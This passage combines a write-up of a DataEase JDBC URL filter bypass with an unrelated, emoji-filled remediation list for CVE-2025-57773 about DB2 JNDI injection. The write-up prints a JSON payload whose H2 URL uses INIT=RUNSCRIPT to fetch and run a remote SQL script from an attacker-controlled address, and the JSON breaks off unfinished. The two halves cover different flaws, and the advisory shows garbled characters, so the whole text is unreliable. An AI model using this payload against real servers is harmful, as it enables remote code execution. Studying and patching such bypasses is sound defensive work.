Here, if the URL meets the criteria, the return value is the corresponding getJdbcUrl method. This is actually the getter method for the JdbcUrl parameter, which corresponds to the value of the JdbcUrl parameter we passed in. This method does not use H2's filtering logic, naturally bypassing the previous patch and returning our H2 JDBC URL. Finally, we pass "driver":"org.h2.Driver" to specify the selected driver. Then, getDriver will also retrieve the corresponding H2 driver, implementing the JDBC connection according to H2's logic.
The current payload is as follows. You can see that the payload here directly includes the filtered keywords INIT and RUNSCRIPT, but it still passes the verification:

```json
{
    "dataBase": "",
    "driver": "org.h2.Driver",
    "jdbcUrl": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:50025/poc.sql'",
    "urlType": "jdbcUrl",
    "sshType": "password",

Here‚Äôs a clear and actionable set of advice for **CVE-2025-57773**:

---

### üîπ Immediate Actions

1. **Upgrade DataEase** ‚¨ÜÔ∏è

   * Install version **2.10.12 or later** immediately. This is the only way to fully patch the vulnerability.

2. **Sanitize DB2 Parameters** üßπ

   * Ensure all database inputs are properly filtered and validated to prevent JNDI injection.

3. **Audit Dependencies** üì¶

   * Confirm that `commons-collections` 4.x and `aspectjweaver-1.9.22.jar` are updated or replaced with safe versions if used elsewhere.

4. **Monitor Logs** üîç

   * Check for unusual activity, especially deserialization attempts or file write anomalies.

5. **Limit Exposure** üîí

   * Restrict external access to DataEase servers until the patch is applied.

---

### üîπ Long-Term Recommendations

* **Regular Updates** üîÑ ‚Äì Keep DataEase and all related libraries up to date.
* **Security Scanning** üõ° ‚Äì Run vulnerability scanners periodically to detect risky components.
* **Incident Response Plan** üìã ‚Äì Prepare procedures for quickly responding to potential exploits.
* **User Awareness** üë• ‚Äì Train admins and developers about injection attacks and safe coding practices.
